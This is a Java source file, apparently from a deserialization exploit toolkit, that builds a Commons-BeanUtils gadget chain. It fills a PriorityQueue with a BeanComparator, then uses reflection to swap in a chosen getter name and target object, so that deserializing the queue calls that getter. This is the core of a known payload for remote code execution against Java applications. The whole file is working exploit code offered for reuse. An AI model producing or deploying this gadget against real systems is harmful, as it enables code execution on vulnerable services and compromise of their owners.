package xyz.eki.marshalexp.gadget.cb;

import org.apache.commons.beanutils.BeanComparator;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class GCB {
    public static PriorityQueue deserialize2Getter(Object obj,String getterName) throws Exception{
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        ReflectUtils.setFieldValue(comparator, "property", getterName);

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectUtils.getFieldValue(queue, "queue");
        queueArray[0] = obj;
        queueArray[1] = obj;
        return queue;
    }
}
